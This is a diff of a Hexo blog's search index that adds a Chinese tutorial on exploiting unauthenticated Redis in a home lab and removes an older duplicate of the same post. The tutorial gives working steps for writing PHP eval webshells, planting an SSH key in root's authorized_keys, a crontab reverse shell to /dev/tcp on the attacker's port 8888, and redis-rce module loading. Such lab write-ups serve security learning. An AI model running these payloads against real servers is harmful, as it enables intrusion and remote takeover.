@@ -19,6 +19,154 @@
 ]]></content>
   </entry>
   <entry>
+    <title>redis未授权</title>
+    <url>/2023/06/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="redis未授权"><a href="#redis未授权" class="headerlink" title="redis未授权"></a>redis未授权</h1><h2 id="什么是redis"><a href="#什么是redis" class="headerlink" title="什么是redis"></a>什么是redis</h2><p>Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库，其具备如下特性：</p>
+<ul>
+<li>基于内存运行，性能高效</li>
+<li>支持分布式，理论上可以无限扩展</li>
+<li>key-value存储系统</li>
+<li>开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API</li>
+</ul>
+<p>相比于其他数据库类型，Redis具备的特点是：</p>
+<ul>
+<li>C&#x2F;S通讯模型</li>
+<li>单进程单线程模型</li>
+<li>丰富的数据类型</li>
+<li>操作具有原子性</li>
+<li>持久化</li>
+<li>高并发读写</li>
+<li>支持lua脚本</li>
+</ul>
+<p>简单来讲，redis其实就是一个非关系型数据库</p>
+<h2 id="redis未授权漏洞原理"><a href="#redis未授权漏洞原理" class="headerlink" title="redis未授权漏洞原理"></a>redis未授权漏洞原理</h2><p>Redis默认情况下是绑定在0.0.0.0:6379端口的，如果没有设置密码（一般密码为空）或者密码为弱密码的情况下并且也没有进行有效保护措施，那么处于公网的redis服务就会被任意的用户未授权访问，读取数据，甚至利用redis自身的命令，进行写入文件操作，这样就会恶意攻击者利用redis未授权漏洞进行进一步攻击。写入文件操作就例如在日志文件里将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
+<h2 id="redis漏洞复现"><a href="#redis漏洞复现" class="headerlink" title="redis漏洞复现"></a>redis漏洞复现</h2><p>这里用的一台windows和一台kali，一台作为攻击机，一台作为靶机</p>
+<h3 id="kali安装redis"><a href="#kali安装redis" class="headerlink" title="kali安装redis"></a>kali安装redis</h3><p>执行如下步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一步 wget http://download.redis.io/releases/redis-2.8.17.tar.gz#下载redis</span><br><span class="line">第二步 tar xzf redis-2.8.17.tar.gz#解压安装包</span><br><span class="line">第三步 cd redis-2.8.17 #进入redis文件夹</span><br><span class="line">第四步 make #在redis-2.8.17文件夹下执行make</span><br><span class="line">第五步 cd src#进入redis-2.8.17文件夹下的src文件夹</span><br><span class="line">第六步 cp redis-server /usr/bin</span><br><span class="line">第七步 cp redis-cli /usr/bin #将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</span><br><span class="line">第八步 cp redis-conf /etc/ #返回目录redis-2.8.17，将redis.conf拷贝到/etc/目录下</span><br><span class="line">第九步 redis-server /etc/redis.conf #使用/etc/目录下的reids.conf文件中的配置启动redis服务</span><br></pre></td></tr></table></figure>
+
+<p><img src="/redis/redis-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%BC%80%E5%90%AF%E6%9C%8D%E5%8A%A1.png"></p>
+<p>如果在执行上诉步骤中遇到相关问题，可以直接把错误回应扔给chatgpt，chatgpt会给出相应解决方法</p>
+<h3 id="windows安装redis"><a href="#windows安装redis" class="headerlink" title="windows安装redis"></a>windows安装redis</h3><p>1.<a href="https://github.com/microsoftarchive/redis/releases">Releases · microsoftarchive&#x2F;redis (github.com)</a></p>
+<p><img src="/redis/windows%E5%AE%89%E8%A3%85reedis.png"></p>
+<p>安装好后解压到对应目录</p>
+<p>2.双击安装目录下的”redis-server.exe”文件，并保持窗口开启（若关闭窗口则服务关闭）。</p>
+<p><img src="/redis/windows%E5%BC%80%E5%90%AFredis%E6%9C%8D%E5%8A%A1.png"></p>
+<p>3.待开启后，就可以实现监听了（一定要在该目录上方输入cmd才行，不要直接右键点击空白处进入终端）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli.exe -h 靶机IP</span><br></pre></td></tr></table></figure>
+
+<p><img src="/redis/windows%E9%80%9A%E8%BF%87redis%E5%AE%9E%E7%8E%B0%E7%9B%91%E5%90%AC.png"></p>
+<p>到这里的环境就安装完毕了</p>
+<h3 id="利用redis写webshell"><a href="#利用redis写webshell" class="headerlink" title="利用redis写webshell"></a>利用redis写webshell</h3><h4 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</span><br><span class="line"></span><br><span class="line">2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（开启web服务器，就可以利用url使用蚁剑进行连接）</span><br></pre></td></tr></table></figure>
+
+<h4 id="开始复现："><a href="#开始复现：" class="headerlink" title="开始复现："></a>开始复现：</h4><p>执行如下步骤：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config get dir #查看redis数据库路径</span><br><span class="line">config set dbfilename 22.php #生成22.php文件</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;#将一句话木马写入文件中</span><br><span class="line">#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n\r\n&quot;#上传木马可以通过蚁剑连接</span><br><span class="line">save#保存</span><br></pre></td></tr></table></figure>
+
+<p><img src="/redis/%E4%B8%8A%E4%BC%A0webshell.png"></p>
+<p>中间有一步是修改路径。后来发现可以不要，接下来去靶机看看是否写入成功</p>
+<p><img src="/redis/%E4%B8%8A%E4%BC%A0webshell%E5%9B%BE%E7%89%872.png"></p>
+<p>可以看到已经写入成功了。到这里但是发现怎么都连接不上，所以就尝试着修改路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>接下来的操作和之前的一样，先进行phpinfo()的测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dbfilename test.php</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="/redis/%E6%B5%8B%E8%AF%95%E8%BF%9E%E6%8E%A5.png"></p>
+<p>接下来在攻击机上进行连接验证（注意一定要在kali linux上开启web服务，例如apache，negix等等，相关下载命令可以问cgatgpt，如果未下载，也可通过php -S 0.0.0.0:8080来实现）</p>
+<p><img src="/redis/%E6%B5%8B%E8%AF%95%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png"></p>
+<p>可见测试连接成功了。</p>
+<p>写入shell文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dbfilename muma.php</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>尝试连接：</p>
+<p><img src="/redis/%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5.png"></p>
+<p><img src="/redis/%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png"></p>
+<h3 id="利用redis进行ssh密钥连接"><a href="#利用redis进行ssh密钥连接" class="headerlink" title="利用redis进行ssh密钥连接"></a>利用redis进行ssh密钥连接</h3><h4 id="ssh密钥连接"><a href="#ssh密钥连接" class="headerlink" title="ssh密钥连接:"></a>ssh密钥连接:</h4><p>大家都知道可以通过ssh远程登录另外一台电脑。ssh登录有两种一个是密码登录，一个是密钥登录我们主要看密钥登录是什么流程，公钥登录是为了解决每次登录服务器都要输入密码的问题，流行使用RSA加密方案，主要流程包含：</p>
+<p>1、客户端生成RSA公钥和私钥</p>
+<p>2、客户端将自己的公钥存放到服务器</p>
+<p>3、客户端请求连接服务器，服务器将一个随机字符串发送给客户端</p>
+<p>4、客户端根据自己的私钥加密这个随机字符串之后再发送给服务器</p>
+<p>5、服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了。</p>
+<h4 id="利用前提：-1"><a href="#利用前提：-1" class="headerlink" title="利用前提："></a>利用前提：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.当redis以root身份运行。</span><br><span class="line"></span><br><span class="line">2.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证。</span><br><span class="line"></span><br><span class="line">3.存在/root/.ssh目录，如果不存在我们可以通过一句话木马连接蚁剑创建目录不过可能进不去root目录权限问题可能或者自己mkdir一个目录毕竟是自己搭建靶场。因为.ssh是隐藏目录可以通过ls -la查看有没有。</span><br></pre></td></tr></table></figure>
+
+<h4 id="开始复现：-1"><a href="#开始复现：-1" class="headerlink" title="开始复现："></a>开始复现：</h4><p>首先要有自己的ssh配套的公钥和私钥</p>
+<p>windows下使用git来生成自己的ssh公钥与私钥，在桌面点击右键选择git bash here，执行如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="/redis/%E4%BD%BF%E7%94%A8git%E7%94%9F%E6%88%90ssh.png"></p>
+<p>在用户名文件夹下的.ssh文件夹里</p>
+<p><img src="/redis/%E5%85%AC%E9%92%A5%E7%94%9F%E6%88%90.png"></p>
+<p>生成密钥之后我们可以将公钥id_rsa.pub里面内容复制粘贴到key.txt文件中，再上传到靶机上面，使用如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type key.txt | redis-cli.exe -h 192.168.10.129 -x set xxx#如果是linux 将type换成cat</span><br><span class="line">#将公钥作为value插入到数据库中，key随便啥值。</span><br><span class="line">redis-cli.exe -h 192.168.10.129 config set dir /root/.ssh</span><br><span class="line">#修改redis数据库路径</span><br><span class="line">redis-cli.exe -h 192.168.10.129 config set dbfilename authorized_keys</span><br><span class="line">#生成缓冲文件authorized_keys</span><br><span class="line">redis-cli.exe -h 192.168.10.129 save</span><br><span class="line">#保存</span><br></pre></td></tr></table></figure>
+
+<p><img src="/redis/redis%E7%9A%84ssh%E5%AF%86%E9%92%A5%E8%BF%9E%E6%8E%A5.png"></p>
+<p>通过命令cd ~&#x2F;.ssh来进入.ssh文件夹下(一定要先成为超级用户，否则会进入失败)</p>
+<p><img src="/redis/%E9%AA%8C%E8%AF%81.ssh%E5%85%AC%E9%92%A5%E6%98%AF%E5%90%A6%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F.png"></p>
+<p>可以看到已经上传成功了，接下来在攻击机上的.ssh文件夹的终端下执行如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.129</span><br><span class="line">#连接</span><br></pre></td></tr></table></figure>
+
+<p><img src="/redis/ssh%E7%A7%81%E9%92%A5%E8%BF%9E%E6%8E%A5.png"></p>
+<p>在这里输入你自己生成的私钥即可</p>
+<p><strong>注意：</strong></p>
+<p><strong>1.如果你是linux系统使用cat,是windows系统使用type.</strong></p>
+<p><strong>2.如果你是windows那你利用ssh密钥连接运行ssh -i id_rsa <a href="mailto:&#x72;&#111;&#111;&#x74;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#x34;&#51;&#x2e;&#x31;&#x34;&#x31;">&#x72;&#111;&#111;&#x74;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#x34;&#51;&#x2e;&#x31;&#x34;&#x31;</a>需要在.ssh目录下，因为权限问题。</strong></p>
+<p><strong>3.你利用redis上传公钥时候运行代码是在你解压的redis文件下运行。</strong></p>
+<p><strong>4.文件名必须是authorized_keys,由配置文件决定的。</strong></p>
+<h3 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h3><h4 id="什么是crontab"><a href="#什么是crontab" class="headerlink" title="什么是crontab"></a>什么是crontab</h4><p>crontab 是一个在类 Unix 系统中定时执行任务的命令，它允许用户在指定的时间点或时间间隔内运行命令或脚本。通常情况下，crontab 命令用于自动化重复性任务，如备份、数据同步、清理日志等。</p>
+<p>用户可以通过 crontab 命令编辑和管理 crontab 文件，其中包含了需要定时执行的任务的详细信息，如执行命令、执行时间、执行频率等等。crontab 文件通常存储在 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs目录下，每个用户都有一个对应的 crontab 文件。</p>
+<p>crontab 命令有很多选项和语法规则，它可以帮助用户创建和管理自己的 crontab 文件。例如，您可以使用 crontab -e命令来编辑您的 crontab 文件，使用 crontab -l命令来列出当前用户的 crontab 文件中的所有任务，使用 crontab -r 命令来删除当前用户的 crontab 文件。还可以使用 man crontab命令来查看 crontab 的详细说明和使用说明。</p>
+<p>总之，crontab 是一个非常强大和常用的类 Unix 系统工具，它能够帮助用户自动化重复性任务，提高工作效率和系统稳定性。</p>
+<h4 id="windows下下载ncat命令"><a href="#windows下下载ncat命令" class="headerlink" title="windows下下载ncat命令"></a>windows下下载ncat命令</h4><p><a href="https://nmap.org/ncat/">这是下载ncat(也就是linux下nc)命令的网址</a></p>
+<p>下载好之后将文件路径添加到PATH路径下面，以便可以在任何路径下使用，配置好后假设监听8888端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
+
+<p>出现如下页面就表示监听成功：</p>
+<p><img src="/redis/windows%E4%B8%8B%E4%BD%BF%E7%94%A8nc.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n* * * * * /bin/bash -i&gt;&amp;/dev/tcp/在windows下使用ipconfig查到的域名/8888 0&gt;&amp;1\n\n&quot;</span><br><span class="line">#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><img src="/redis/redis%E5%BC%B9shell.png"></p>
+<p>![](redis&#x2F;kali 检测是否上传反弹文件成功.png)</p>
+<h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><p>可能我们上面的工作都做好了之后会发现依旧没有给我们弹shell</p>
+<p><strong>第一个</strong>：首先你要看一下你的cron启动没有，可以先查看状态如果是running,那就不用管，如果不是就需要启动一下，一般而言cron都是自启动的。所以一般来说不会是这个出问题。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service crond restart#重启</span><br><span class="line">service crond start#启动</span><br><span class="line">service crond stop#关闭</span><br><span class="line">service crond status#查看状态</span><br></pre></td></tr></table></figure>
+
+<p>上面的命令不是一定的，有的环境下crond服务叫cron，可以用以下命令检测自己的cron服务叫什么名字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl list-unit-files | grep cron</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二个</strong>：我发现我的cron启动了但是依然无法反弹shell,去找了资料知道利用redis未授权访问写的任务计划文件都有乱码，这是乱码来自redis的缓存数据，这个问题无法解决的。centos会忽略乱码去执行格式正确的任务计划，而ubuntu和debian并不会忽略这些乱码，所以导致命令执行失败。我们手动删除乱码发现反弹仍然失败，查看资料发现我们还需要关注以下问题。</p>
+<p><strong>第三个</strong>:root文件的权限必须为600也就是说是rw———–，执行如下命令进行排查和更改</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l</span><br><span class="line">chmod 600 root </span><br></pre></td></tr></table></figure>
+
+<p><strong>第四个</strong>:我们反弹shell的&#x2F;bin&#x2F;sh是bash，而我的靶机的bin&#x2F;sh是dash ,所以运行出错。我们需要通过以下命令查看和修改。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /bin/sh#查看运行环境</span><br><span class="line">ln -s -f bash /bin/sh#修改为bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/redis/%E4%BF%AE%E6%94%B9%E5%8F%8D%E5%BC%B9%E7%9A%84%E8%B7%AF%E5%BE%84.png"></p>
+<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><h4 id="了解什么是主从复制"><a href="#了解什么是主从复制" class="headerlink" title="了解什么是主从复制"></a>了解什么是主从复制</h4><p>edis主从复制我们简单理解为有两台redis服务器,一个是主，一个是从，两台服务器的数据是一样的，主服务器负责写入数据，从服务器负责读取数据。一般一个主服务器有好几个从服务器，且从服务器可能也是其他redis服务器的主服务器。这样的好处就是如果主服务器或者一个从服务器崩溃不会影响数据完整性，且读写分开，减轻服务器压力。这个大家自己找一些资料了解一下。</p>
+<h4 id="主从复制反弹shell"><a href="#主从复制反弹shell" class="headerlink" title="主从复制反弹shell"></a>主从复制反弹shell</h4><p>如果要是的利用成功需要先下载攻击代码，步骤已经给到大家。不过linux来git clone可能会失败，所以这里的步骤是在windows上下载好之后直接将文件拖进linux，这里还有注意如果利用redis主从复制redis版本要是4.x或者5.x</p>
+<p>靶机：kali 192.168.10.129</p>
+<p>攻击机 windows 192.168.10.1</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git</span><br><span class="line">    #下载RedisModules-ExecuteCommand</span><br><span class="line">git clone https://github.com/Ridter/redis-rce</span><br><span class="line">    #下载redis-rce</span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+
+<p><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%87%86%E5%A4%87.png"></p>
+<p>就会在相应文件夹下生成两个文件夹<br><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%87%86%E5%A4%872.png"></p>
+<p>将这两个文件夹拖入linux下，并进入RedisModules-ExecuteCommand目录，执行如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
+
+<p><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%87%86%E5%A4%873.png"></p>
+<p>编译之后执行如下名令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv module.so /home/yyb167111/桌面/redis-rce  #就是redis-rce所在路径</span><br></pre></td></tr></table></figure>
+
+<p>执行之后，就将redis-rce拖入windows下，也就是复制，然后进入到redis-rce文件夹目录下，执行cmd进入终端，然后执行如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.10.129 -L 192.168.10.1 -f module.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%BC%B9shell.png"></p>
+<p>可以看到一些参数，-r指的是靶机IP -L指的是攻击机IP，如果没有指定端口就会使用默认端口。</p>
+<p>运行以下命令，会让你选择，可以输入i,r,e分别对应交互式shell,反弹shell和退出吧。</p>
+<p>如果反弹shell就需要监听端口</p>
+<p><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8F%8D%E5%BC%B9shell2.png"></p>
+<p>注意：如果redis需要密码，可以加-a参数。</p>
+]]></content>
+  </entry>
+  <entry>
     <title>vulhub搭建</title>
     <url>/2023/06/02/vulhub%E6%90%AD%E5%BB%BA/</url>
     <content><![CDATA[<h1 id="vulhub靶场搭建及使用"><a href="#vulhub靶场搭建及使用" class="headerlink" title="vulhub靶场搭建及使用"></a>vulhub靶场搭建及使用</h1><h2 id="1-进行系统更新"><a href="#1-进行系统更新" class="headerlink" title="1.进行系统更新"></a>1.进行系统更新</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su			             进入超级用户</span><br><span class="line">apt-get update                更新系统，防止后面安装时报错</span><br><span class="line">apt-get upgrade               更新软件包</span><br><span class="line">apt-get dist-upgrade          更新系统版本。如果你对新版本软件的需求不是那么迫切，可以不执行</span><br></pre></td></tr></table></figure>
@@ -151,154 +299,6 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
 
 <p>这下就搞定啦</p>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2023/06/09/redis%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
-    <content><![CDATA[<h1 id="redis未授权"><a href="#redis未授权" class="headerlink" title="redis未授权"></a>redis未授权</h1><h2 id="什么是redis"><a href="#什么是redis" class="headerlink" title="什么是redis"></a>什么是redis</h2><p>Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库，其具备如下特性：</p>
-<ul>
-<li>基于内存运行，性能高效</li>
-<li>支持分布式，理论上可以无限扩展</li>
-<li>key-value存储系统</li>
-<li>开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API</li>
-</ul>
-<p>相比于其他数据库类型，Redis具备的特点是：</p>
-<ul>
-<li>C&#x2F;S通讯模型</li>
-<li>单进程单线程模型</li>
-<li>丰富的数据类型</li>
-<li>操作具有原子性</li>
-<li>持久化</li>
-<li>高并发读写</li>
-<li>支持lua脚本</li>
-</ul>
-<p>简单来讲，redis其实就是一个非关系型数据库</p>
-<h2 id="redis未授权漏洞原理"><a href="#redis未授权漏洞原理" class="headerlink" title="redis未授权漏洞原理"></a>redis未授权漏洞原理</h2><p>Redis默认情况下是绑定在0.0.0.0:6379端口的，如果没有设置密码（一般密码为空）或者密码为弱密码的情况下并且也没有进行有效保护措施，那么处于公网的redis服务就会被任意的用户未授权访问，读取数据，甚至利用redis自身的命令，进行写入文件操作，这样就会恶意攻击者利用redis未授权漏洞进行进一步攻击。写入文件操作就例如在日志文件里将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
-<h2 id="redis漏洞复现"><a href="#redis漏洞复现" class="headerlink" title="redis漏洞复现"></a>redis漏洞复现</h2><p>这里用的一台windows和一台kali，一台作为攻击机，一台作为靶机</p>
-<h3 id="kali安装redis"><a href="#kali安装redis" class="headerlink" title="kali安装redis"></a>kali安装redis</h3><p>执行如下步骤</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一步 wget http://download.redis.io/releases/redis-2.8.17.tar.gz#下载redis</span><br><span class="line">第二步 tar xzf redis-2.8.17.tar.gz#解压安装包</span><br><span class="line">第三步 cd redis-2.8.17 #进入redis文件夹</span><br><span class="line">第四步 make #在redis-2.8.17文件夹下执行make</span><br><span class="line">第五步 cd src#进入redis-2.8.17文件夹下的src文件夹</span><br><span class="line">第六步 cp redis-server /usr/bin</span><br><span class="line">第七步 cp redis-cli /usr/bin #将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</span><br><span class="line">第八步 cp redis-conf /etc/ #返回目录redis-2.8.17，将redis.conf拷贝到/etc/目录下</span><br><span class="line">第九步 redis-server /etc/redis.conf #使用/etc/目录下的reids.conf文件中的配置启动redis服务</span><br></pre></td></tr></table></figure>
-
-<p><img src="/redis%5Credis-server%E6%9C%AA%E6%8E%88%E6%9D%83%E5%BC%80%E5%90%AF%E6%9C%8D%E5%8A%A1.png"></p>
-<p>如果在执行上诉步骤中遇到相关问题，可以直接把错误回应扔给chatgpt，chatgpt会给出相应解决方法</p>
-<h3 id="windows安装redis"><a href="#windows安装redis" class="headerlink" title="windows安装redis"></a>windows安装redis</h3><p>1.<a href="https://github.com/microsoftarchive/redis/releases">Releases · microsoftarchive&#x2F;redis (github.com)</a></p>
-<p><img src="/redis%5Cwindows%E5%AE%89%E8%A3%85reedis.png"></p>
-<p>安装好后解压到对应目录</p>
-<p>2.双击安装目录下的”redis-server.exe”文件，并保持窗口开启（若关闭窗口则服务关闭）。</p>
-<p><img src="/redis%5Cwindows%E5%BC%80%E5%90%AFredis%E6%9C%8D%E5%8A%A1.png"></p>
-<p>3.待开启后，就可以实现监听了（一定要在该目录上方输入cmd才行，不要直接右键点击空白处进入终端）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli.exe -h 靶机IP</span><br></pre></td></tr></table></figure>
-
-<p><img src="/redis%5Cwindows%E9%80%9A%E8%BF%87redis%E5%AE%9E%E7%8E%B0%E7%9B%91%E5%90%AC.png"></p>
-<p>到这里的环境就安装完毕了</p>
-<h3 id="利用redis写webshell"><a href="#利用redis写webshell" class="headerlink" title="利用redis写webshell"></a>利用redis写webshell</h3><h4 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</span><br><span class="line"></span><br><span class="line">2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（开启web服务器，就可以利用url使用蚁剑进行连接）</span><br></pre></td></tr></table></figure>
-
-<h4 id="开始复现："><a href="#开始复现：" class="headerlink" title="开始复现："></a>开始复现：</h4><p>执行如下步骤：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">config get dir #查看redis数据库路径</span><br><span class="line">config set dbfilename 22.php #生成22.php文件</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;#将一句话木马写入文件中</span><br><span class="line">#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n\r\n&quot;#上传木马可以通过蚁剑连接</span><br><span class="line">save#保存</span><br></pre></td></tr></table></figure>
-
-<p><img src="/redis%5C%E4%B8%8A%E4%BC%A0webshell.png"></p>
-<p>中间有一步是修改路径。后来发现可以不要，接下来去靶机看看是否写入成功</p>
-<p><img src="/redis%5C%E4%B8%8A%E4%BC%A0webshell%E5%9B%BE%E7%89%872.png"></p>
-<p>可以看到已经写入成功了。到这里但是发现怎么都连接不上，所以就尝试着修改路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html</span><br></pre></td></tr></table></figure>
-
-<p>接下来的操作和之前的一样，先进行phpinfo()的测试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dbfilename test.php</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<p><img src="/redis/%E6%B5%8B%E8%AF%95%E8%BF%9E%E6%8E%A5.png"></p>
-<p>接下来在攻击机上进行连接验证（注意一定要在kali linux上开启web服务，例如apache，negix等等，相关下载命令可以问cgatgpt，如果未下载，也可通过php -S 0.0.0.0:8080来实现）</p>
-<p><img src="/redis/%E6%B5%8B%E8%AF%95%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png"></p>
-<p>可见测试连接成功了。</p>
-<p>写入shell文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dbfilename muma.php</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<p>尝试连接：</p>
-<p><img src="/redis/%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5.png"></p>
-<p><img src="/redis/%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png"></p>
-<h3 id="利用redis进行ssh密钥连接"><a href="#利用redis进行ssh密钥连接" class="headerlink" title="利用redis进行ssh密钥连接"></a>利用redis进行ssh密钥连接</h3><h4 id="ssh密钥连接"><a href="#ssh密钥连接" class="headerlink" title="ssh密钥连接:"></a>ssh密钥连接:</h4><p>大家都知道可以通过ssh远程登录另外一台电脑。ssh登录有两种一个是密码登录，一个是密钥登录我们主要看密钥登录是什么流程，公钥登录是为了解决每次登录服务器都要输入密码的问题，流行使用RSA加密方案，主要流程包含：</p>
-<p>1、客户端生成RSA公钥和私钥</p>
-<p>2、客户端将自己的公钥存放到服务器</p>
-<p>3、客户端请求连接服务器，服务器将一个随机字符串发送给客户端</p>
-<p>4、客户端根据自己的私钥加密这个随机字符串之后再发送给服务器</p>
-<p>5、服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了。</p>
